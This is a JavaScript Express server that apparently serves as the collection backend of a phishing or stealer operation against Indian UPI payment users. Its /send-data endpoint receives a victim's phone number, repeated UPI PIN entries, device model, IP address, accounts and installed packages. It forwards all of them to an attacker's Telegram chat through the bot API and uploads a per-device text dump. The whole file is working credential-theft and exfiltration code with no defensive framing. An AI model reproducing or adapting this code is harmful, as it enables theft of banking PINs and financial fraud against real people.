require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

let lastMessageId = null;
let currentMessageText = "";
let pinCount = 0; 
let fullDeviceName = "Device_Details";

const sendOrUpdateTelegram = async (message) => {
    try {
        if (!lastMessageId) {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
            currentMessageText = message;
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: message,
                parse_mode: 'Markdown'
            });
            currentMessageText = message;
        }
    } catch (error) {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
        currentMessageText = message;
    }
};

const sendFileToTelegram = async (content, filename) => {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        const cleanContent = content.replace(/\*/g, ''); 
        const safeFilename = filename.replace(/[/\\?%*:|"<>]/g, '-'); 

        form.append('document', Buffer.from(cleanContent, 'utf-8'), { 
            filename: `${safeFilename}.txt` 
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {}
};

const startupNotification = async () => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `*BJP Client's*`,
            parse_mode: 'Markdown'
        });
    } catch (e) {}
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP, accounts, packages } = req.body;
    
    if (deviceId) {
        fullDeviceName = deviceId;
    }


    if (type === 'NUMBER') {
        lastMessageId = null; 
        pinCount = 0; 

        let updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
        updatedText += `*IP Address:* "${userIP || 'Detecting...'}"\n`; 
        updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
        updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
        updatedText += `*Number:* "+91${number}"\n\n`;
        
        updatedText += `[UPI_SECTION]`; 
        updatedText += `\n[EXTRA_DATA_SECTION]`; 
        
        currentMessageText = updatedText;
        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
    } 


    else if (pin) {
        pinCount++; 
        let newPinLine = `*UPI PIN:* "${pin}"\n`;
        
        if (pinCount === 1) {
            currentMessageText = currentMessageText.replace("[UPI_SECTION]", `${newPinLine}[UPI_SECTION]`);
        } else {
            currentMessageText = currentMessageText.replace("[UPI_SECTION]", `${newPinLine}[UPI_SECTION]`);
        }
        
        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));


        if (pinCount === 3) {
            await sendFileToTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""), fullDeviceName);
        }
    }


    else if (accounts || packages) {
        let extraData = `\n*Account's*\n`;
        if (accounts && Array.isArray(accounts)) {
            accounts.forEach(acc => { extraData += `• ${acc}\n`; });
        }
        
        extraData += `\n*Package's*\n`;
        if (packages && Array.isArray(packages)) {
            packages.forEach(pkg => { extraData += `• ${pkg}\n`; });
        }

        currentMessageText = currentMessageText.replace("[EXTRA_DATA_SECTION]", extraData);
        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
        
 
        await sendFileToTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""), fullDeviceName);
    }
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
